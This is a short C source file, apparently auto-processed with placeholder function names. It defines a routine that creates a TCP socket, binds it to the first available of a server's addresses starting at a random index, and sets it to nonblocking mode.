#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; scalar_t__ sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct server {int bind_addrs_len; int /*<<< orphan*/ * bind_addrs; } ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  F_GETFL ; 
 int /*<<< orphan*/  F_SETFL ; 
 int O_NONBLOCK ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  TRUE ; 
 int FUNC0 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (int,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int FUNC4 () ; 
 int FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

int FUNC6(struct server *srv)
{
    struct sockaddr_in bind_addr;
    int i, fd, start_addr;
    BOOL bound = FALSE;

    if ((fd = FUNC5(AF_INET, SOCK_STREAM, 0)) == -1)
        return -1;

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = 0;

    // Try to bind on the first available address
    start_addr = FUNC4() % srv->bind_addrs_len;
    for (i = 0; i < srv->bind_addrs_len; i++)
    {
        bind_addr.sin_addr.s_addr = srv->bind_addrs[start_addr];
        if (FUNC0(fd, (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            if (++start_addr == srv->bind_addrs_len)
                start_addr = 0;
        }
        else
        {
            bound = TRUE;
            break;
        }
    }
    if (!bound)
    {
        FUNC1(fd);
#ifdef DEBUG
        printf("Failed to bind on any address\n");
#endif
        return -1;
    }

    // Set the socket in nonblocking mode
    if (FUNC2(fd, F_SETFL, FUNC2(fd, F_GETFL, 0) | O_NONBLOCK) == -1)
    {
#ifdef DEBUG
        printf("Failed to set socket in nonblocking mode. This will have SERIOUS performance implications\n");
#endif
    }
    return fd;
}